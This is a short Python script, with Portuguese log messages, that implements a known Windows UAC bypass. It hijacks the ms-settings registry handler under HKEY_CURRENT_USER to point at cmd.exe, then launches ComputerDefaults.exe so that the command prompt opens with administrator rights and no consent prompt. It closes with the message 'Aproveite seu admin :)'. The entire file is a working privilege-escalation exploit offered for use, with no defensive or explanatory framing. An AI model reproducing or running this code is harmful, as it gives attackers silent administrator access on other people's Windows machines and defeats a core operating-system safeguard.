import os
import sys
import ctypes
import winreg  
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def create_reg_key(key, value):
    try:
    
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open\command')
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open\command', 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
        logging.info("Chave de registro criada com sucesso.")
    except WindowsError as e:
        logging.error(f"Erro ao criar chave de registro: {e}")
        raise

def exec_bypass_uac(cmd):
    try:
        # Executa a função para criar chaves de registro necessárias
        create_reg_key('DelegateExecute', '')
        create_reg_key(None, cmd)
        logging.info("Comando para bypass UAC configurado.")
    except WindowsError as e:
        logging.error(f"Erro ao executar bypass UAC: {e}")
        raise

def bypass_uac():        
    try:                
        # Obtém o diretório atual e configura o comando a ser executado
        current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
        cmd = r"C:\windows\System32\cmd.exe"
        exec_bypass_uac(cmd)                
        os.system(r'C:\windows\system32\ComputerDefaults.exe')  
        logging.info("UAC bypassed com sucesso.")
        return 1               
    except WindowsError as e:
        logging.error(f"Erro ao tentar contornar UAC: {e}")
        sys.exit(1)       

if __name__ == '__main__':
    if bypass_uac():
        print("Aproveite seu admin :)")
